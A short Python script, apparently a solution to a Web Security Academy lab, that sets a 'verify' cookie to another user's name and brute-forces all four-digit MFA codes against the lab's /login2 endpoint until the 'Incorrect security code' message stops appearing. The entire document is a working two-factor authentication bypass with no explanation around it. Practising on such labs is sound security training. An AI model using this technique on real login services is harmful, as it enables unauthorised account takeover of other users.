import requests

url = "https://0a5f003d03562b928eec2046005e00fc.web-security-academy.net/login2"

# Ask for verification code
cookies = {"verify": "carlos"}
requests.get(url, cookies=cookies)

# Brute-force verification code
for i in range(10_000):
    code = f"{i:04}"
    r = requests.post(url, cookies=cookies, data={"mfa-code": code})
    print(code)
    if "Incorrect security code" not in r.text:
        break
print(code)